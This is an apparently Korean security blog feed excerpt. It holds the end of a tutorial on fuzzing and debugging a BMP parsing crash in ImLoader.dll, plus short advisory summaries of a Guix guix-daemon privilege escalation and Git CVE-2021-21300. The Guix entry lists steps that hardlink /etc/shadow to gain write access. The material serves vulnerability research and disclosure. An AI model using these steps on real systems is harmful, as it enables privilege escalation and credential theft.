&#xCC3E;&#xC544;&#xAC00;&#xBA74;&#xC11C; &#xC368;&#xBCF4;&#xC2DC;&#xBA74; &#xB3C4;&#xC6C0;&#xC774; &#xB9CE;&#xC774; &#xB420; &#xAC70; &#xAC19;&#xB124;&#xC694;. &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xBCF4;&#xBA74;&#xC11C; &#xD558;&#xB2E4;&#xAC00; &#xB098;&#xC911;&#xC5D0;&#xB294; &#xC548; &#xBCF4;&#xACE0;&#xB3C4; &#xC798; &#xC4F0;&#xB294; &#xB098; &#xC790;&#xC2E0;&#xC744; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;</p><p>&#xADF8;&#xB7FC; &#xC544;&#xAE4C; &#xC9C1;&#xC811; &#xC81C;&#xC791;&#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xB611;&#xAC19;&#xC774; &#xAC12;&#xB4E4;&#xC744; &#xC704; &#xAC12;&#xB4E4;&#xB85C; &#xBC14;&#xAFB8;&#xACE0; &#xBE44;&#xD2B8;&#xB9F5; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB450; <code>0x41</code>&#xB85C; &#xBC14;&#xAFBC; &#xB2E4;&#xC74C; &#xB514;&#xBC84;&#xAC70;&#xB85C; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--020.png" alt="./bughunting-tutorials-part3/image--020.png"></p><p><code>eax</code>&#xAC00; &#xC6B0;&#xB9AC;&#xAC00; &#xB123;&#xC740; <code>0x41414141</code>&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xB124;&#xC694;. &#xADF8;&#xB7FC; &#xC774; &#xAC12;&#xC774; &#xC5B4;&#xB514;&#xC11C; &#xC624;&#xB294;&#xC9C0; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--022.png" alt="./bughunting-tutorials-part3/image--022.png"></p><p>&#xD604;&#xC7AC; <code>eip</code> &#xBC14;&#xB85C; &#xC704; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xBCF4;&#xBA74; <code>esp</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; <code>eax</code>&#xAC12;&#xC744; &#xAC00;&#xC838;&#xC624;&#xB124;&#xC694;. &#xC789; &#xADFC;&#xB370; &#xC5EC;&#xAE30; &#xC2A4;&#xD0DD;&#xC778;&#xB370;???(&#xC774;&#xAC70; &#xC2A4;&#xD0DD; &#xC624;&#xBC84; &#xCDE8;&#xC57D;&#xC810; &#xC544;&#xB2C8;&#xC5C8;&#xB294;&#xB370;;;;)<br>&#xADF8;&#xB7FC; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; &#xD30C;&#xC77C;&#xC774; &#xC5B4;&#xB514;&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xBCFC;&#xAC8C;&#xC694;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--024.png" alt="./bughunting-tutorials-part3/image--024.png"></p><p>&#xBB54;&#xAC00; &#xB9E4;&#xC6B0; &#xB9CE;&#xC774; &#xC788;&#xB124;&#xC694;;;; &#xBE44;&#xD2B8;&#xB9F5; &#xC815;&#xBCF4;&#xAC00; &#xC804;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xB294; &#xAC74; <code>0x0725f056</code> ~ <code>0x0753b70d</code> &#xC815;&#xB3C4;&#xC778; &#xAC70; &#xAC19;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; &#xC774; &#xC911; &#xC5B4;&#xB518;&#xAC00;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC628; &#xAC78;&#xB85C; &#xBCF4;&#xC774;&#xACE0;&#xC694;. &#xC544;&#xC9C1;&#xC740; &#xBB54; &#xAC08; &#xC54C; &#xC218;&#xB294; &#xC5C6;&#xB124;&#xC694;. &#xC774;&#xC81C; &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF4;&#xBA74;&#xC11C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xC5B4;&#xB514;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--026.png" alt="./bughunting-tutorials-part3/image--026.png"></p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC8FC;&#xC758;&#xD574;&#xC57C; &#xD560; &#xAC83;&#xC740; &#xC800; <code>WARNING</code>&#xC774;&#xB77C;&#xACE0; &#xB72C; &#xBD80;&#xBD84;&#xC778;&#xB370;&#xC694;. &#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C; &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCE74;&#xC6B4;&#xD130;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294;&#xB370; &#xC774;&#xAC8C; &#xC798;&#xBABB;&#xB418;&#xC5B4;&#xC11C; &#xC81C;&#xB300;&#xB85C; &#xBABB; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC800;&#xB300;&#xB85C; &#xB530;&#xB77C;&#xAC00;&#xB3C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC744; &#xC54C; &#xC218;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC5B4;&#xB5BB;&#xAC8C; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xC57C; &#xD560;&#xAE4C;&#xC694; &#x3160;&#x3160;&#x3160;</p><p>&#xBCF4;&#xD1B5; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB450; &#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xB294; &#xB370; &#x201C;&#xD0D1;&#xB2E4;&#xC6B4;&#x201D; &#xBC29;&#xC2DD;&#xACFC; &#x201C;&#xBC14;&#xD140;&#xC5C5;&#x201C; &#xBC29;&#xC2DD;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xB2F9;&#xC5F0;&#xD788; &#xC704;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xB85C; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC704;&#xB85C; &#xAC00;&#xC9C0; &#xC88C;&#xC6B0;&#xB85C; &#xAC08; &#xC21C; &#xC5C6;&#xC796;&#xC544;&#xC694;?)</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--028.png" alt="./bughunting-tutorials-part3/image--028.png"></p><p>&#xBB50; &#xC554;&#xD2BC; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xB09C; &#xADF8; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC704;&#xB85C; &#xC62C;&#xB77C;&#xAC00;&#xBA74;&#xC11C; &#xBCFC; &#xAC83;&#xC774;&#xB0D0; &#xC544;&#xB2C8;&#xBA74; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xB098;&#xB294; &#xBD80;&#xBD84; &#xC880; &#xC704;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xBAA8;&#xB4E0; &#xCF54;&#xB4DC;&#xB97C; &#xBCFC; &#xAC83;&#xC774;&#xB0D0;&#xAC00; &#xBB38;&#xC81C;&#xC778;&#xB370;&#x2026; &#xC774;&#xAC70;&#xB294; &#xAC01;&#xC790;&#xC758; &#xC131;&#xD5A5; &#xD639;&#xC740; &#xC0C1;&#xD669;&#xC5D0; &#xB530;&#xB77C; &#xACB0;&#xC815;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xCD5C;&#xB300;&#xD55C; &#xBD84;&#xC11D; &#xBC94;&#xC704;&#xB97C; &#xC904;&#xC5EC;&#xC11C; &#xB9AC;&#xBC84;&#xC2F1; &#xC2DC;&#xAC04;&#xC744; &#xB2E8;&#xCD95;&#xC2DC;&#xD0A4;&#xB294; &#xAC8C; &#xC81C;&#xC77C; &#xD604;&#xBA85;&#xD55C; &#xC120;&#xD0DD;&#xC774;&#xC9C0;&#xB9CC; &#xC800; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xB294; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xB3C4; &#xCC3E;&#xC744; &#xACB8; &#xD0D1;&#xB2E4;&#xC6B4; &#xBC29;&#xC2DD;&#xC744; &#xC120;&#xD638;&#xD558;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;.(&#xC2DC;&#xAC04; &#xC878;&#xB77C; &#xC624;&#xB798; &#xAC78;&#xB9AC;&#xC9C0;&#xB9CC;&#x2026;.) &#xC8FC;&#xC758;&#xD574;&#xC57C; &#xD560; &#xAC83;&#xC740; &#xD0D1;&#xB2E4;&#xC6B4; &#xBC29;&#xC2DD;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xB54C; &#xC5B4;&#xB514;&#xC11C;&#xBD80;&#xD130; &#xD560;&#xC9C0; &#xC798; &#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. dib &#xD3EC;&#xB9F7;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC6CC;&#xB099; &#xAD6C;&#xC870;&#xAC00; &#xB2E8;&#xC21C;&#xD574;&#xC11C; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD560; &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xAC00; &#xC791;&#xC9C0;&#xB9CC; &#xB2E4;&#xB978; &#xD3EC;&#xB9F7;&#xC758; &#xACBD;&#xC6B0; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD560; &#xCF54;&#xB4DC;&#xB7C9;&#xC774; &#xBC29;&#xB300;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBD84;&#xC11D;&#xD560; &#xBBA4;&#xD14C;&#xC774;&#xD2B8; &#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xACE0; &#xC5B4;&#xB5A4; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xD30C;&#xC545;&#xD55C; &#xB2E4;&#xC74C;, &#xADF8; &#xBD80;&#xBD84;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;</p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xCC98;&#xC74C; &#xD574;&#xC11D;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB294;&#xB370; &#xD5E4;&#xB354; &#xBD80;&#xBD84;&#xC774; BM&#xC774;&#xC5C8;&#xC8E0;? &#xBD84;&#xBA85; &#xCF54;&#xB4DC;&#xC5D0; &#xD5E4;&#xB354;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xACA0;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xC544;&#xC774;&#xB2E4;&#xC5D0;&#xC11C; <code>BM</code>&#xC774;&#xB77C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--030.jpg" alt="./bughunting-tutorials-part3/image--030.jpg"></p><p>&#xB294;&#x2026; &#xB9DD;.. &#xC5C6;&#xB124;&#x2026;. &#xB2E4;&#xB978; &#xAC74; &#xB2E4; &#xC788;&#xB358;&#xB370;&#x2026; &#xC5ED;&#xC2DC; &#xC778;&#xC0DD;&#xC740; &#xB0B4; &#xB9D8;&#xB300;&#xB85C; &#xC548;&#xB418;&#xB294;&#xAD70;&#x2026; &#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xD3B8;&#xD55C; &#xBC29;&#xBC95;&#xC774; &#xC5C6;&#xC73C;&#xB2C8; &#xC9C1;&#xC811; &#xCC3E;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4; &#x3160;&#x3160;</p><p>&#xCF5C; &#xC2A4;&#xD0DD;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xB098;&#xC624;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xD558;&#xB098;&#xD558;&#xB098; &#xBCFC; &#xC218;&#xBC16;&#xC5D0; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--032.png" alt="./bughunting-tutorials-part3/image--032.png"></p><p>&#xC774;&#xC911;&#xC5D0; &#xC544;&#xBB34;&#xAC70;&#xB098; &#xD55C; &#xBC88; &#xBCFC;&#xAC8C;&#xC694;. </p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--034.png" alt="./bughunting-tutorials-part3/image--034.png"></p><p>&#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB77C;&#xBA74; &#xBC14;&#xB85C; &#xC704; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; <code>call</code>&#xC774;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370; <code>ret</code>&#xC774;&#xB124;&#xC694;. &#xC774; &#xC8FC;&#xC18C;&#xB294; &#xC6B0;&#xC5F0;&#xD788; &#xADF8;&#xB0E5; &#xADF8; &#xBAA8;&#xB4C8;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC744; &#xBFD0;&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xB807;&#xAC8C; <code>dds</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC785;&#xB825;&#xD574;&#xC11C; &#xBCF4;&#xC774;&#xB294; &#xC8FC;&#xC18C;&#xB4E4;&#xC774; &#xBAA8;&#xB450; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xC778; &#xAC83;&#xB9CC;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD558;&#xB098;&#xD558;&#xB098; &#xD655;&#xC778;&#xC744; &#xD558;&#xACE0; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC9C4;&#xD589;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD0DD; &#xC880; &#xC704;&#xC5D0;&#xC11C; &#xC720;&#xD6A8;&#xD55C; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xCC3E;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--036.png" alt="./bughunting-tutorials-part3/image--036.png"></p><p>&#xC774; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB294; &#xAD1C;&#xCC2E;&#xC740; &#xAC70; &#xAC19;&#xB124;&#xC694;! &#xADF8;&#xB7FC; &#xC5EC;&#xAE30;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xACE0; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--038.png" alt="./bughunting-tutorials-part3/image--038.png"></p><p>&#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xC774;&#xB807;&#xAC8C; &#xB728;&#xBA74;&#xC11C; &#xB85C;&#xB529;&#xC774; &#xC880; &#xB290;&#xB9AC;&#xAC8C; &#xB418;&#xB294;&#xB370; <code>sxe ld ImLoader.dll</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xCE58;&#xBA74; <code>ImLoader.dll</code> &#xC774; &#xB85C;&#xB4DC;&#xB420; &#xB54C; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAC8C; &#xB418;&#xBA74; &#xC800;&#xB807;&#xAC8C; &#xB290;&#xB9AC;&#xAC8C; &#xB85C;&#xB529;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xACA0;&#xC8E0;. &#xBAA8;&#xB4C8;&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xACE0; &#xBE0C;&#xD3EC;&#xB97C; &#xAC78;&#xAC8C; &#xB418;&#xBA74; &#xC880; &#xB354; &#xBE60;&#xB974;&#xAC8C; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--040.png" alt="./bughunting-tutorials-part3/image--040.png"></p><p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xC9C0;&#xC810;&#xC5D0;&#xC11C; &#xC798; &#xAC78;&#xB9AC;&#xB124;&#xC694;. &#xADF8;&#xB7FC; &#xD30C;&#xC77C;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--042.png" alt="./bughunting-tutorials-part3/image--042.png"></p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--044.png" alt="./bughunting-tutorials-part3/image--044.png"></p><p>&#xC774; &#xC911; &#xB450; &#xBD80;&#xBD84;&#xB9CC; &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB124;&#xC694;. &#xADF8;&#xB7FC; &#xD5E4;&#xB354;&#xAE4C;&#xC9C0; &#xC788;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xD5E4;&#xB354; &#xBD80;&#xBD84;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xACE0; &#xC55E;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xBCFC;&#xAC8C;&#xC694;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--046.png" alt="./bughunting-tutorials-part3/image--046.png"></p><p>&#x2026;&#xB294; Fail&#x2026;. &#xAD1C;&#xCC2E;&#xC544;&#xC694;&#x2026; &#xC774;&#xB7F4; &#xC218; &#xC788;&#xC8E0;&#x2026;. &#xAF3C;&#xC218; &#xC4F0;&#xC9C0; &#xB9D0;&#xACE0; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xD558;&#xB77C;&#xB294; &#xC2E0;&#xC758; &#xACC4;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB9C8; &#xD30C;&#xC77C; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xAC00;&#xC838;&#xC640; &#xBE44;&#xAD50;&#xB97C; &#xD558;&#xAC70;&#xB098; &#xB2E4;&#xC2DC; &#xB2E4;&#xB978; &#xACF3;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xAC70;&#xB098;&#x2026; &#xC544;&#xB2C8;&#xBA74; &#xC5EC;&#xAE30;&#xB3C4; &#xC81C;&#xC77C; &#xC704;&#xAC00; &#xC544;&#xB2C8;&#xAC70;&#xB098;&#x2026; &#xC5EC;&#xB7EC; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xAC00; &#xC788;&#xC744; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. &#xBB50; &#xB2E4;&#xB978; &#xB370; &#xBE0C;&#xD3EC; &#xAC78;&#xC5B4;&#xC11C; &#xD560; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xB2E4;&#xB978; &#xBC29;&#xBC95;&#xB3C4; &#xC368;&#xBCFC;&#xAC8C;&#xC694;. &#xADF8; &#xB2E4;&#xB978; &#xBC29;&#xBC95;&#xC740; Part 4&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h1 id="Part-4-&#xC608;&#xACE0;"><a href="#Part-4-&#xC608;&#xACE0;" class="headerlink" title="Part 4 &#xC608;&#xACE0;"></a>Part 4 &#xC608;&#xACE0;</h1><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%203.png" alt="./bughunting-tutorials-part3/Untitled%203.png"></p><blockquote><p>EIP&#xAC00; &#xC548;&#xC7A1;&#xD788;&#xC796;&#xC544;!!!!</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Guix lpe via guix-daemon</title>
    <link href="/2021/03/24/fabu1ous/2021-03-24/"/>
    <url>/2021/03/24/fabu1ous/2021-03-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://guix.gnu.org/en/blog/2021/risk-of-local-privilege-escalation-via-guix-daemon/">Risk of local privilege escalation via guix-daemon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Guix</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Guix&#xB294; GNU &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C;&#xD55C; GNU &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. Guix&#xC758; guix-daemon&#xC5D0;&#xC11C; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xB294; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC131;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Multi-user setup&#xC774; &#xB41C; &#xB85C;&#xCEEC; &#xC2DC;&#xC2A4;&#xD15C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC758; &#xD574;&#xCEE4;&#xB294; guix build&#xC640; &#xAC19;&#xC740; &#xBE4C;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD574; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; world-writable&#xB85C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xACF5;&#xACA9; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xBE4C;&#xB4DC; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC18D;&#xC5D0; <code>/etc/shadow</code>&#xC640; &#xAC19;&#xC774; root &#xC18C;&#xC720;&#xC758; &#xD30C;&#xC77C;&#xC758;  hardlink&#xB97C; &#xC0DD;&#xC131;</li><li><code>--keep-failed</code> &#xC635;&#xC158;&#xC744; &#xBD99;&#xC778; &#xBE4C;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD638;&#xCD9C;</li><li>&#xBE4C;&#xB4DC; &#xC2E4;&#xD328; &#xC2DC; daemon&#xC740; &#xC804;&#xCCB4; &#xBE4C;&#xB4DC; &#xD2B8;&#xB9AC;&#xB97C; &#xD604;&#xC7AC; &#xC720;&#xC800; &#xC18C;&#xC720;&#xB85C; &#xBCC0;&#xACBD;</li><li>hardlink &#xB41C; root &#xC18C;&#xC720;&#xC758; &#xD30C;&#xC77C;&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xC0DD;&#xAE40;</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>gnu</tag>
      
      <tag>multi-user</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21300: Git의 저장소 clone 원격 코드 실행 취약점</title>
    <link href="/2021/03/23/l0ch/2021-03-23/"/>
    <url>/2021/03/23/l0ch/2021-03-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.openwall.com/lists/oss-security/2021/03/09/3">git: malicious repositories can execute remote code while cloning</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Git(2.14.2.windows.1&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xB428;)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBC84;&#xC804; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC778; Git&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xB97C; clone &#xD558;&#xB294; &#xB3C4;&#xC911; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xAD00;&#xB828; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>&#xD0C0;&#xAE43; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; NTFS&#xC640; &#xAC19;&#xC774; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC9C0;&#xC6D0;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.(Windows &#xBC0F; macOS&#xC758; &#xAE30;&#xBCF8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;)</p></li><li><p>Git LFS&#xC640; &#xAC19;&#xC774; clean &#xD639;&#xC740; smudge &#xD544;&#xD130;&#xAC00; &#xC804;&#xC5ED;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4;&#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xC545;&#xC131; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; 